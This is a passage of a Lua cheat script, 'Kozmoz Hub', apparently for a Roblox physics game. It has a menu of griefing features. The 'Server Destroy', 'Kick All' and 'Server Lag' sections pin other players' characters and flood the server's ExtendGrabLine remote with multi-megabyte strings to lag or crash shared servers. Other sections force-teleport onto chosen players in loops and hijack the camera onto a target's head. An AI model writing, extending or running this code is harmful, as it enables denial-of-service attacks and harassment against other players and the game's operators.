                    pcall(function()
                        local bp = Instance.new("BodyPosition")
                        bp.Name = "ServerDestroyBP"
                        bp.P = 100000000
                        bp.D = 1000
                        bp.MaxForce = Vector3.new(1e9, 1e9, 1e9)
                        bp.Position = targetPos
                        bp.Parent = data.hrp

                        task.spawn(function()
                            for i = 1, 80 do
                                if bp.Parent and data.hrp then
                                    data.hrp.CFrame = CFrame.new(targetPos)
                                    data.hrp.AssemblyLinearVelocity = Vector3.zero
                                    data.hrp.AssemblyAngularVelocity = Vector3.zero
                                    bp.Position = targetPos
                                end
                                task.wait(0.08)
                            end
                        end)

                        task.delay(6, function()
                            pcall(function() bp:Destroy() end)
                        end)
                    end)

                    task.wait(0.1)
                end

                for _ = 1, 30 do
                    for _, data in ipairs(playerData) do
                        BK_destroyLineOnPlayer(data.hrp)
                    end
                    task.wait(0.2)
                end

                BK_Notify("Server Destroy", "Saldiri bitti. Line lag hala calisiyor.")
            end)
        end
    })

    BlobmanServerGroup:AddButton({
        Text = "Stop Line Lag",
        Func = function()
            BK_stopLineLag()
            BK_Notify("Line Lag", "Durduruldu.")
        end
    })

    -- ===================== UI: Blobman Kick All =====================
    BlobmanKickAllGroup = Tabs.BlobmanTab:AddRightGroupbox("Blobman Kick All", "bot")

    BlobmanKickAllGroup:AddToggle("BlobmanKickAllFriends", {
        Text = "Arkadaslari hariç tut",
        Default = false,
        Callback = function(Value)
            BK.ExcludeFriends = Value
        end
    })

    BlobmanKickAllGroup:AddButton({
        Text = "Kick All [BLOB]",
        Func = function()
            task.spawn(BK_KickAll)
        end
    })

    BlobmanKickAllGroup:AddButton({
        Text = "Stop Lag",
        Func = function()
            BK_stopLineLag()
            BK_Notify("Lag", "Stop")
        end
    })
end

NotifGroup = Tabs.ServerTab:AddLeftGroupbox("Notifications", "bell")

BlackHoleDetector = {
    Enabled = false,
    Connection = nil
}

local function playKickSound()
    s = Instance.new("Sound")
    s.SoundId = "rbxassetid://79150789336480"
    s.Volume = 4
    s.PlayOnRemove = true
    s.Parent = SoundService
    s:Destroy()
end

local function notifyKick(plr)
    Library:Notify({
        Title = "Kozmoz Hub - Player Kicked",
        Description = plr.DisplayName .. " (" .. plr.Name .. ") has been Kicked!",
        Duration = 8,
        Type = "warning"
    })
end

local function getClosestPlayer(pos)
    closest, dist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr.Character then
            hrp = plr.Character:FindFirstChild("HumanoidRootPart")
            if hrp then
                d = (hrp.Position - pos).Magnitude
                if d < dist then
                    dist = d
                    closest = plr
                end
            end
        end
    end
    return closest
end

local function startBlackHoleDetector()
    if BlackHoleDetector.Connection then return end
    BlackHoleDetector.Connection = Workspace.ChildAdded:Connect(function(obj)
        if not BlackHoleDetector.Enabled then return end
        kickNames = {
            ["blackholekick"] = true,
            ["blackholekicktweens"] = true,
            ["blackholekicktweens(old)"] = true,
            ["jhole"] = true,
            ["blackhole"] = true,
            ["black_hole"] = true,
            ["voidhole"] = true,
            ["singularity"] = true,
        }
        if kickNames[obj.Name:lower()] then
            task.wait(0.08)
            pos = nil
            if obj:IsA("BasePart") then
                pos = obj.Position
            elseif obj:IsA("Model") then
                primary = obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")
                if primary then pos = primary.Position end
            end
            if pos then
                plr = getClosestPlayer(pos)
                if plr then
                    playKickSound()
                    notifyKick(plr)
                end
            end
        end
    end)
end

NotifGroup:AddToggle("BlackHoleDetectorToggle", {
    Text = "Black Hole Kick Detector",
    Default = false,
    Callback = function(Value)
        BlackHoleDetector.Enabled = Value
        if Value then
            startBlackHoleDetector()
            Library:Notify({Title = "KOZMOZ", Description = "Black Hole Detector active", Duration = 4, Type = "success"})
        else
            if BlackHoleDetector.Connection then
                BlackHoleDetector.Connection:Disconnect()
                BlackHoleDetector.Connection = nil
            end
        end
    end
})

NotifGroup:AddToggle("PacketLagNotifyToggle", {
    Text = "Packet Lag Detector",
    Default = false,
    Callback = function(Value)
        if Value then
            RS = game:GetService("ReplicatedStorage")
            activepackets = false
            if RS.GrabEvents and RS.GrabEvents.ExtendGrabLine then
                RS.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(player, args)
                    if typeof(args) == "string" and string.len(args) > 300 and not activepackets then
                        activepackets = true
                        function GetSizeMB(StringLength)
                            return StringLength / (1024 * 1024)
                        end
                        SizeRounded = math.round(GetSizeMB(string.len(args)) * 1000) / 1000
                        Library:Notify({
                            Title = "Kozmoz Hub - Packet lag",
                            Description = player.Name.." Sent Packets, Size:"..SizeRounded.." Mb",
                            Time = 4,
                        })
                        task.wait(4)
                        activepackets = false
                    end
                end)
            end
        end
    end
})

JL = {
    PlayerJoinLeaveEnabled = false,
    JoinLeaveConnections = {}
}

NotifGroup:AddToggle("PlayerJoinLeaveToggle", {
    Text = "Player Join / Leave Notify",
    Default = false,
    Callback = function(Value)
        JL.PlayerJoinLeaveEnabled = Value
        if Value then
            JL.JoinLeaveConnections["PlayerAdded"] = Players.PlayerAdded:Connect(function(plr)
                Library:Notify({
                    Title = "Kozmoz Hub - Player Joined",
                    Description = plr.DisplayName .. " (" .. plr.Name .. ") Joined the Server!",
                    Duration = 5,
                    Type = "success"
                })
            end)
            JL.JoinLeaveConnections["PlayerRemoving"] = Players.PlayerRemoving:Connect(function(plr)
                Library:Notify({
                    Title = "Kozmoz Hub - Player Left",
                    Description = plr.DisplayName .. " (" .. plr.Name .. ") Left the Server!",
                    Duration = 5,
                    Type = "warning"
                })
            end)
            Library:Notify({Title = "KOZMOZ", Description = "Join/Leave Notifications active", Duration = 4, Type = "info"})
        else
            for _, conn in pairs(JL.JoinLeaveConnections) do
                if conn then conn:Disconnect() end
            end
            JL.JoinLeaveConnections = {}
        end
    end
})

DeathNotify = {
    Enabled = false,
    LastResetTime = 0,
    Connection = nil
}

function isRecentReset()
    return tick() - DeathNotify.LastResetTime < 3 
end

function notifyKilled(killerName)
    if isRecentReset() then return end
    Library:Notify({
        Title = "Kozmoz Hub - Killed",
        Description = "From: " .. (killerName or "Unknown") .. " ",
        Duration = 6,
        Type = "error"
    })
    playKickSound()
end

function startDeathDetector()
    if DeathNotify.Connection then return end
    DeathNotify.Connection = LocalPlayer.CharacterAdded:Connect(function(char)
        task.wait(0.5)
        hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        hum.Died:Connect(function()
            if not DeathNotify.Enabled then return end
            killer = nil
            closestDist = math.huge
            myPos = hum.RootPart and hum.RootPart.Position or Vector3.new()
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and plr.Character then
                    hrp = plr.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        dist = (hrp.Position - myPos).Magnitude
                        if dist < closestDist and dist < 100 then
                            closestDist = dist
                            killer = plr.DisplayName
                        end
                    end
                end
            end
            notifyKilled(killer)
        end)
    end)
end

oldResetFunc = nil
if RightGroupbox then
    for _, child in pairs(RightGroupbox.Container:GetChildren()) do
        if child:IsA("TextButton") and child.Text:find("Reset Character") then
            oldFunc = child.Activated and child.Activated.Connect or nil
            child.MouseButton1Click:Connect(function()
                DeathNotify.LastResetTime = tick()
            end)
        end
    end
end

NotifGroup:AddToggle("DeathNotifyToggle", {
    Text = "Notify when Killed",
    Default = false,
    Callback = function(Value)
        DeathNotify.Enabled = Value
        if Value then
            startDeathDetector()
            Library:Notify({
                Title = "Kozmoz Hub - Killed",
                Description = "Killed-Notification active",
                Duration = 4,
                Type = "success"
            })
        else
            if DeathNotify.Connection then
                DeathNotify.Connection:Disconnect()
                DeathNotify.Connection = nil
            end
        end
    end
})

packetLagActive = false
packetLagTask = nil
lagLineActive = false
packetLagInterval = 0.05
packetLagPrefix = ""

function BuildBigString(targetSize)
    local prefix = packetLagPrefix
    local prefixTag = ""
    if prefix and prefix ~= "" then
        prefixTag = "[PREFIX:" .. prefix .. "]"
    end
    local fillSize = targetSize - #prefixTag
    if fillSize < 0 then fillSize = 0 end
    local s = "A"
    while #s < fillSize do
        s = s .. s
    end
    return prefixTag .. string.sub(s, 1, fillSize)
end

function StartPacketLagSpammer(mb)
    local GrabEvents = game.ReplicatedStorage.GrabEvents
    local ExtendGrabLine = GrabEvents.ExtendGrabLine
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local targetBytes = math.floor(mb * 1024 * 1024)
    local payload = BuildBigString(targetBytes)
    while packetLagActive do
        local othersExist = false
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                othersExist = true
                break
            end
        end
        if othersExist then
            pcall(function()
                ExtendGrabLine:FireServer(payload)
            end)
        end
        task.wait(packetLagInterval)
    end
end

ServerLagGroup = Tabs.ServerTab:AddLeftGroupbox("Server Lag", "server")

local lagLineActive = false
local lagLineTask = nil
local lps = 150

ServerLagGroup:AddToggle("ServerLagLineToggle", {
    Text = "Server Lag Line",
    Default = false,
    Callback = function(v)
        lagLineActive = v
        if v then
            lagLineTask = task.spawn(function()
                local ExtendGrabLine = Services.rs.GrabEvents:WaitForChild("ExtendGrabLine")
                while lagLineActive do
                    for i = 1, lps do
                        if not lagLineActive then break end
                        pcall(function()
                            ExtendGrabLine:FireServer(string.rep("A", 500))
                        end)
                    end
                    task.wait(1)
                end
            end)
        else
            if lagLineTask then
                task.cancel(lagLineTask)
                lagLineTask = nil
            end
        end
    end
})

ServerLagGroup:AddSlider("LagLineIntensity", {
    Text = "Lag Line Intensity",
    Default = 150,
    Min = 1,
    Max = 1000,
    Rounding = 0,
    Callback = function(Value)
        lps = Value
    end
})

ServerLagGroup:AddDivider()

ServerLagGroup:AddToggle("PacketLagToggle", {
    Text = "Packet Lag",
    Default = false,
    Callback = function(Value)
        packetLagActive = Value
        local mb = Options.PacketLagStrength and Options.PacketLagStrength.Value or 4.77
        if Value then
            packetLagTask = task.spawn(function()
                StartPacketLagSpammer(mb)
            end)
        else
            if packetLagTask then
                task.cancel(packetLagTask)
                packetLagTask = nil
            end
        end
    end
})

ServerLagGroup:AddSlider("PacketLagStrength", {
    Text = "Packet Lag Strength (MB)",
    Default = 4.77,
    Min = 0.01,
    Max = 12,
    Rounding = 2,
    Callback = function(Value)
    end
})

ServerLagGroup:AddSlider("PacketLagInterval", {
    Text = "Interval",
    Default = 0.05,
    Min = 0.01,
    Max = 1.0,
    Rounding = 2,
    Callback = function(Value)
        packetLagInterval = Value
    end
})
ServerLagGroup:AddInput("PacketLagPrefix", {
    Text = "Custom Prefix",
    Placeholder = "Enter prefix text...",
    Callback = function(Value)
        packetLagPrefix = Value
    end
})
oldServerCleanup = getgenv().KozmozLoadingCleanup
getgenv().KozmozLoadingCleanup = function()
    lagLineActive = false
    packetLagActive = false
    packetLagNotifyEnabled = false
    if lagLineTask then
        task.cancel(lagLineTask)
        lagLineTask = nil
    end
    if packetLagTask then
        task.cancel(packetLagTask)
        packetLagTask = nil
    end
    if oldServerCleanup then oldServerCleanup() end
end

TPPlayerGroup = Tabs.ServerTab:AddRightGroupbox("TP to Player", "rocket")

TPState = {
    selectedPlayer = nil,
    allPlayers = {},
    playerDropdown = nil,
    searchInput = nil,
    tpLoopActive = false,
    tpLoopTask = nil
}

function updateTPPlayerList()
    list = {}
    for _, p in ipairs(Services.Players:GetPlayers()) do
        if p ~= Services.LocalPlayer then
            table.insert(list, p.DisplayName .. " (@" .. p.Name .. ")")
        end
    end
    table.sort(list)
    return list
end

function extractUsernameFromTPFormat(formatted)
    return formatted:match("%(@(.+)%)")
end

function teleportToSelectedPlayer()
    username = extractUsernameFromTPFormat(TPState.selectedPlayer)
    target = Services.Players:FindFirstChild(username)
    targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
    myChar = Services.LocalPlayer.Character
    myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
    pcall(function()
        myHRP.AssemblyLinearVelocity = Vector3.zero
        myHRP.AssemblyAngularVelocity = Vector3.zero
        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 2, 3)
        myHum = myChar:FindFirstChild("Humanoid")
        if myHum then
            myHum.Sit = false
            myHum.PlatformStand = false
            myHum:ChangeState(Enum.HumanoidStateType.Running)
        end
        Library:Notify({
            Title = "Kozmoz",
            Description = "Tp To  " .. target.DisplayName .. "!",
            Duration = 2,
            Type = "success"
        })
    end)
end

function startTPLoop()
    if TPState.tpLoopTask then return end
    TPState.tpLoopTask = task.spawn(function()
        while TPState.tpLoopActive do
            username = extractUsernameFromTPFormat(TPState.selectedPlayer)
            if username then
                target = Services.Players:FindFirstChild(username)
                if target and target.Character then
                    targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
                    myChar = Services.LocalPlayer.Character
                    myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if targetHRP and myHRP then
                        pcall(function()
                            myHRP.AssemblyLinearVelocity = Vector3.zero
                            myHRP.AssemblyAngularVelocity = Vector3.zero
                            myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 2, 3)
                            myHum = myChar:FindFirstChild("Humanoid")
                            if myHum then
                                myHum.Sit = false
                                myHum.PlatformStand = false
                                myHum:ChangeState(Enum.HumanoidStateType.Running)
                            end
                        end)
                    end
                end
            end
            task.wait(1.5)
        end
        TPState.tpLoopTask = nil
    end)
end

function stopTPLoop()
    TPState.tpLoopActive = false
    if TPState.tpLoopTask then
        task.cancel(TPState.tpLoopTask)
        TPState.tpLoopTask = nil
    end
end

function searchTPPlayer(searchTerm)
    allPlayers = updateTPPlayerList()
    if not searchTerm or searchTerm == "" then
        TPState.playerDropdown:SetValues(allPlayers)
        if #allPlayers > 0 then
            TPState.playerDropdown:SetValue(allPlayers[1])
            TPState.selectedPlayer = allPlayers[1]
        end
        return
    end
    searchLower = string.lower(searchTerm)
    matches = {}
    for _, value in ipairs(allPlayers) do
        valueLower = string.lower(value)
        if string.find(valueLower, searchLower, 1, true) then
            table.insert(matches, value)
        end
    end
    if #matches > 0 then
        TPState.playerDropdown:SetValues(matches)
        TPState.playerDropdown:SetValue(matches[1])
        TPState.selectedPlayer = matches[1]
    else
        TPState.playerDropdown:SetValues({"No Player Found"})
        TPState.selectedPlayer = nil
    end
end

TPPlayerGroup:AddLabel("Select a Player", true, Color3.fromRGB(255, 160, 0))

TPState.searchInput = TPPlayerGroup:AddInput("TPSearchInput", {
    Text = "Search Player",
    Placeholder = "Type Name...",
    Callback = function(value)
        searchTPPlayer(value)
    end
})

playerList = updateTPPlayerList()
TPState.playerDropdown = TPPlayerGroup:AddDropdown("TPPlayerDropdown", {
    Text = "Select Player",
    Values = #playerList > 0 and playerList or {"No Player Found"},
    Default = 1,
    Callback = function(value)
        TPState.selectedPlayer = value
    end
})

TPPlayerGroup:AddButton({
    Text = "Refresh List",
    Func = function()
        newList = updateTPPlayerList()
        if #newList > 0 then
            TPState.playerDropdown:SetValues(newList)
            TPState.playerDropdown:SetValue(newList[1])
            TPState.selectedPlayer = newList[1]
        else
            TPState.playerDropdown:SetValues({"No Player Found"})
        end
    end
})

TPPlayerGroup:AddDivider()

TPPlayerGroup:AddButton({
    Text = "TP to Player",
    Func = function()
        teleportToSelectedPlayer()
    end
})

TPPlayerGroup:AddDivider()

TPPlayerGroup:AddToggle("TPLoopToggle", {
    Text = "TP Loop",
    Default = false,
    Callback = function(Value)
        TPState.tpLoopActive = Value
        if Value then
            if not TPState.selectedPlayer or TPState.selectedPlayer == "" then
                TPState.tpLoopActive = false
                Toggles.TPLoopToggle:SetValue(false)
                return
            end
            startTPLoop()
        else
            stopTPLoop()
        end
    end
})

-- =====================================================================
-- [KOZMOZ PORT] View kutusu (TP to Player altina)
-- musa(4) kaynagindan tasiindi; Obsidian elemanlarina uyarlandi ve
-- musa'daki davranisin tamami (durum + yardimci fonksiyonlar) korundu.
-- =====================================================================
ViewGroup = Tabs.ServerTab:AddRightGroupbox("View", "eye")
do
    local function applyScreenStretch(cf)
        if not KozFlags.screenStretchEnabled then return cf end
        local t = KozFlags.screenStretchIntensity / 500
        if t <= 0 then return cf end
        local right = cf.RightVector
        local up = cf.UpVector
        local r = right.Magnitude
        local u = up.Magnitude
        if r > 0.001 then right = right / r end
        if u > 0.001 then up = up / u end
        return CFrame.fromMatrix(cf.Position, right * (1 + t * 0.2), up * (1 - t * 0.35), -cf.LookVector)
    end
    local function setCamCFrame(cf)
        local cam = KozWS.CurrentCamera
        if cam then cam.CFrame = applyScreenStretch(cf) end
    end

    local viewTarget = nil
    local viewEnabled = false
    local viewConn = nil
    local miscViewCombo
    local viewYaw = 0
    local viewPitch = 0
    local viewMouseConn = nil
    local viewSavedData = {}
    local function viewHideAccessories(character)
        local head = character:FindFirstChild("Head")
        if head then
            if not viewSavedData._saved then
                viewSavedData.headTransparency = head.Transparency
                for _, obj in ipairs(head:GetChildren()) do
                    pcall(function()
                        if obj:IsA("Decal") then
                            viewSavedData[obj] = obj.Transparency
                        elseif obj:IsA("SpecialMesh") then
                            viewSavedData[obj] = {MeshId = obj.MeshId, TextureId = obj.TextureId}
                        elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                            viewSavedData[obj] = obj.Enabled
                        end
                    end)
                end
                for _, acc in ipairs(character:GetDescendants()) do
                    if acc:IsA("Accessory") then
                        local handle = acc:FindFirstChild("Handle")
                        if handle then
                            viewSavedData[handle] = handle.Transparency
                        end
                    end
                end
                viewSavedData._saved = true
            end
            head.Transparency = 1
            for _, obj in ipairs(head:GetChildren()) do
                pcall(function()
                    if obj:IsA("Decal") then
                        obj.Transparency = 1
                    elseif obj:IsA("SpecialMesh") then
                        obj.MeshId = ""
                        obj.TextureId = ""
                    elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                        obj.Enabled = false
                    end
                end)
            end
        end
        for _, acc in ipairs(character:GetDescendants()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then handle.Transparency = 1 end
            end
        end
    end
    local function viewRestorePlayer(playerName)
        local target = playerName and KozPlayers:FindFirstChild(playerName)
        if not target or not target.Character then return end
        local head = target.Character:FindFirstChild("Head")
        if head then
            head.Transparency = viewSavedData.headTransparency or 0
            for _, obj in ipairs(head:GetChildren()) do
                pcall(function()
                    if obj:IsA("Decal") then
                        obj.Transparency = viewSavedData[obj] or 0
                    elseif obj:IsA("SpecialMesh") then
                        local saved = viewSavedData[obj]
                        if saved then
                            obj.MeshId = saved.MeshId
                            obj.TextureId = saved.TextureId
                        end
                    elseif obj:IsA("SurfaceGui") or obj:IsA("BillboardGui") then
                        if viewSavedData[obj] ~= nil then
                            obj.Enabled = viewSavedData[obj]
                        end
                    end
                end)
            end
        end
        for _, acc in ipairs(target.Character:GetDescendants()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then
                    handle.Transparency = viewSavedData[handle] or 0
                end
            end
        end
        viewSavedData = {}
    end
    ViewGroup:AddButton({
        Text = "Refresh Players",
        Func = function()
            pcall(function() miscViewCombo:SetValues(updateTPPlayerList()) end)
            -- [KOZMOZ] musa'daki bolum-yenileme adimi Obsidian'da gereksiz
        end
    })
    miscViewCombo = ViewGroup:AddDropdown("KozMiscViewDropdown", {
        Text = "Select Target",
        Values = updateTPPlayerList(),
        Callback = function(value)
            local name = extractUsernameFromTPFormat(value)
            if name then
                viewTarget = name
                -- ayni hedefi kick/aura motorlari da kullansin
                KozFlags.selectedTarget = name
            end
        end
    })
    ViewGroup:AddToggle("KozMiscView", {
        Text = "View",
        Default = false,
        Callback = function(v)
            viewEnabled = v
            if viewConn then viewConn:Disconnect() viewConn = nil end
            if viewMouseConn then viewMouseConn:Disconnect() viewMouseConn = nil end
            if v then
                if not viewTarget then
                    pcall(function() Library:Notify({ Title = "Kozmoz", Description = "View acilmadi: once 'Select Target' listesinden oyuncu sec (gerekirse Refresh Players).", Time = 4 }) end)
                end
                viewYaw = 0
                viewPitch = 0
                UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
                UserInputService.MouseIcon = ""
                viewConn = KozRun.RenderStepped:Connect(function()
                        if not viewEnabled then return end
                        local tName = viewTarget
                        if not tName then return end
                        local target = KozPlayers:FindFirstChild(tName)
                        if not target or not target.Character then return end
                        local tHead = target.Character:FindFirstChild("Head")
                        if not tHead then return end
                        viewHideAccessories(target.Character)
                        local cam = KozWS.CurrentCamera
                        cam.CameraType = Enum.CameraType.Scriptable
                        local baseCF = tHead.CFrame
                        local rotation = CFrame.Angles(0, viewYaw, 0) * CFrame.Angles(viewPitch, 0, 0)
                        setCamCFrame(baseCF * rotation)
                    end)
                viewMouseConn = UserInputService.InputChanged:Connect(function(input)
                        if not viewEnabled then return end
                        if input.UserInputType == Enum.UserInputType.MouseMovement then
                            local d = input.Delta
                            if d then
                                viewYaw = viewYaw - d.X * 0.002
                                viewPitch = math.clamp(viewPitch - d.Y * 0.002, -math.pi / 2 + 0.01, math.pi / 2 - 0.01)
                            end
                        end
                    end)
            else
                if viewMouseConn then viewMouseConn:Disconnect() viewMouseConn = nil end
                viewRestorePlayer(viewTarget)
                UserInputService.MouseBehavior = Enum.MouseBehavior.Default
                KozWS.CurrentCamera.CameraType = Enum.CameraType.Custom
            end
        end
    })
    local camViewEnabled = false
    local camViewConn = nil
    local camViewOriginalCF = nil
    local camViewPart = nil
    local camViewOriginalSubject = nil
    ViewGroup:AddToggle("KozMiscCamView", {
        Text = "Camera View",
        Default = false,
        Callback = function(v)
            camViewEnabled = v
            if camViewConn then camViewConn:Disconnect() camViewConn = nil end
            if v then
                if not viewTarget then
                    pcall(function() Library:Notify({ Title = "Kozmoz", Description = "Camera View icin once 'Select Target'tan oyuncu sec.", Time = 4 }) end)
                end
                local cam = KozWS.CurrentCamera
                camViewOriginalCF = cam.CFrame
                camViewOriginalSubject = cam.CameraSubject
                local tName = viewTarget
                if not tName then return end
                local target = KozPlayers:FindFirstChild(tName)
                if not target or not target.Character then return end
                local tHead = target.Character:FindFirstChild("Head")
                if not tHead then return end
                viewHideAccessories(target.Character)
                local myChar = KozPLR.Character
                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
                camViewPart = Instance.new("Part")
                camViewPart.Size = Vector3.new(1, 1, 1)
                camViewPart.Transparency = 1
                camViewPart.CanCollide = false
                camViewPart.Anchored = true
                camViewPart.CFrame = myRoot and myRoot.CFrame or CFrame.new(0, 50, 0)
                camViewPart.Parent = KozWS
                cam.CameraSubject = camViewPart
                camViewConn = KozRun.Heartbeat:Connect(function()
                        if not camViewEnabled then return end
                        local tName = viewTarget
                        if not tName then return end
                        local target = KozPlayers:FindFirstChild(tName)
                        if not target or not target.Character then return end
                        local tHead = target.Character:FindFirstChild("Head")
                        if not tHead then return end
                        if camViewPart and camViewPart.Parent then
                            camViewPart.CFrame = tHead.CFrame
                        end
                        viewHideAccessories(target.Character)
                    end)
            else
                viewRestorePlayer(viewTarget)
                local cam = KozWS.CurrentCamera
                if camViewOriginalCF then
                    setCamCFrame(camViewOriginalCF)
                end
                cam.CameraSubject = camViewOriginalSubject
                if camViewPart then camViewPart:Destroy() camViewPart = nil end
            end
        end
    })
    ViewGroup:AddButton({
        Text = "TP",
        Func = function()
            local tName = viewTarget
            warn("Select target first!")
            pcall(function() Library:Notify({ Title = "Kozmoz", Description = "TP icin once 'Select Target'tan oyuncu sec.", Time = 4 }) end)
            local target = KozPlayers:FindFirstChild(tName)
            if not target or not target.Character then return end
            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
            local myRoot = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
            if tRoot and myRoot then
                myRoot.CFrame = tRoot.CFrame
            end
        end
    })
    local viewForceTP = false
    local viewForceSide = "Backward"
    local viewForceDist = 5
    local viewForceConn = nil
    ViewGroup:AddToggle("KozMiscViewForceTP", {
        Text = "Force TP",
        Default = false,
        Callback = function(v)
            viewForceTP = v
            if viewForceConn then viewForceConn:Disconnect() viewForceConn = nil end
            if v then
                if not viewTarget then
                    pcall(function() Library:Notify({ Title = "Kozmoz", Description = "Force TP icin once 'Select Target'tan oyuncu sec.", Time = 4 }) end)
                end
                viewForceConn = KozRun.Heartbeat:Connect(function()
                        if not viewForceTP then return end
                        local tName = viewTarget
                        if not tName then return end
                        local target = KozPlayers:FindFirstChild(tName)
                        if not target or not target.Character then return end
                        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
                        local myRoot = KozPLR.Character and KozPLR.Character:FindFirstChild("HumanoidRootPart")
                        if not tRoot or not myRoot then return end
                        local offset = Vector3.zero
                        local cf = tRoot.CFrame
                        if viewForceSide == "Backward" then
                            offset = -cf.LookVector * viewForceDist
                        elseif viewForceSide == "Forward" then
                            offset = cf.LookVector * viewForceDist
                        elseif viewForceSide == "Left" then
                            offset = -cf.RightVector * viewForceDist
                        elseif viewForceSide == "Right" then
                            offset = cf.RightVector * viewForceDist
                        end
                        myRoot.CFrame = CFrame.new(tRoot.Position + offset, tRoot.Position)
                    end)
            end
        end
    })
    ViewGroup:AddDropdown("KozMiscViewForceSide", {
        Text = "Force TP Side",
        Values = {"Backward", "Forward", "Left", "Right"},
        Callback = function(v)
            viewForceSide = v
        end
    })
    ViewGroup:AddSlider("KozMiscViewForceDist", {
        Text = "Distance",
        Min = 1,
        Max = 15,
        Default = 5,
        Rounding = 0,
        Suffix = "studs",
        Callback = function(v)
            viewForceDist = v
        end
    })
end

Services.Players.PlayerAdded:Connect(function()
    task.wait(0.5)
    newList = updateTPPlayerList()
    if #newList > 0 and TPState.playerDropdown then
        pcall(function() TPState.playerDropdown:SetValues(newList) end)
    end
end)

Services.Players.PlayerRemoving:Connect(function()
    task.wait(0.3)
    newList = updateTPPlayerList()
    if #newList > 0 and TPState.playerDropdown then
        pcall(function() TPState.playerDropdown:SetValues(newList) end)
    end
end)

oldTPCleanup = getgenv().KozmozLoadingCleanup
getgenv().KozmozLoadingCleanup = function()
    stopTPLoop()
    if oldTPCleanup then oldTPCleanup() end
end

SavedLocations = {
    ["Spawn"] = CFrame.new(1.6, -7.4, -6.4),
    ["Blue House"] = CFrame.new(532.0, 96.5, -364.8),
    ["Chinese House"] = CFrame.new(560.0, 145.4, -93.0),
    ["Green House"] = CFrame.new(-538.2, -7.4, 75.8),
    ["Red House"] = CFrame.new(-482.5, -7.4, -153.0),
    ["Green House 2"] = CFrame.new(-352.8, 98.6, 354.2),
    ["Factory"] = CFrame.new(128.9, 347.2, 356.6),
    ["Horror House"] = CFrame.new(271.0, -7.4, 444.7),
    ["UFO"] = CFrame.new(-58.5, 59.8, -404.4),
}

selectedLocation = nil
tpLoopActive = false
tpLoopTask = nil

function teleportToLocation(name)
    if not SavedLocations[name] then
        print(" Place didnt Found: " .. name)
        return false
    end
    local char = game.Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CFrame = SavedLocations[name]
        hrp.AssemblyLinearVelocity = Vector3.zero
        hrp.AssemblyAngularVelocity = Vector3.zero
        print("Teleported to : " .. name)
        return true
    end
    return false
end

function saveLocation(name)
    local char = game.Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    SavedLocations[name] = hrp.CFrame
    print(" Place Saved: " .. name)
    updateDropdown()
end

function deleteLocation(name)
    if SavedLocations[name] then
        SavedLocations[name] = nil
        print("Deleted: " .. name)
        updateDropdown()
    end
end

function updateDropdown()
    if locationDropdown then
        local names = {}
        for name, _ in pairs(SavedLocations) do
            table.insert(names, name)
        end
        table.sort(names)
        locationDropdown:SetValues(names)
        if #names > 0 then
            locationDropdown:SetValue(names[1])
            selectedLocation = names[1]
        end
    end
end

function startTPLoop()
    if tpLoopTask then return end
    tpLoopTask = task.spawn(function()
        while tpLoopActive do
            if selectedLocation and SavedLocations[selectedLocation] then
                local char = game.Players.LocalPlayer.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.CFrame = SavedLocations[selectedLocation]
                    hrp.AssemblyLinearVelocity = Vector3.zero
                    hrp.AssemblyAngularVelocity = Vector3.zero
                end
            end
            task.wait(0.1)
        end
        tpLoopTask = nil
    end)
end

function stopTPLoop()
    tpLoopActive = false
    if tpLoopTask then
        task.cancel(tpLoopTask)
        tpLoopTask = nil
    end
end

LocationsGroup = Tabs.ServerTab:AddRightGroupbox("Place Tp", "map")

local names = {}
for name, _ in pairs(SavedLocations) do
    table.insert(names, name)
end
table.sort(names)

locationDropdown = LocationsGroup:AddDropdown("LocationDropdown", {
    Text = "Select Place",
    Values = names,
    Default = 1,
    Callback = function(value)
        selectedLocation = value
    end
})

LocationsGroup:AddButton({
    Text = "Tp to Selected Place",
    Func = function()
        if selectedLocation then
            teleportToLocation(selectedLocation)
        else
            print("❌ Wähle einen Ort aus!")
        end
    end
})

LocationsGroup:AddDivider()

LocationsGroup:AddToggle("LocationsLoopToggle", {
    Text = "TP Loop",
    Default = false,
    Callback = function(Value)
        tpLoopActive = Value
        if Value then
            if not selectedLocation then
                print("Select a Place First!")
                tpLoopActive = false
                Toggles.LocationsLoopToggle:SetValue(false)
                return
            end
            startTPLoop()
        else
            stopTPLoop()
        end
    end
})

LocationsGroup:AddDivider()

LocationsGroup:AddLabel("Save New Place", true, Color3.fromRGB(0, 255, 100))

saveNameInput = LocationsGroup:AddInput("SaveLocationInput", {
    Text = "Name for Place",
    Placeholder = "e.g Fav Place, Pookie Place",
    Callback = function(value)
        saveName = value
    end
})

LocationsGroup:AddButton({
    Text = "Save Current Position!",
    Func = function()
        if saveName and saveName ~= "" then
            saveLocation(saveName)
        else
            print("First Type a Name for the Current Position!")
        end
    end
})

LocationsGroup:AddDivider()

LocationsGroup:AddButton({
    Text = "Delete Selected Place",
    Func = function()
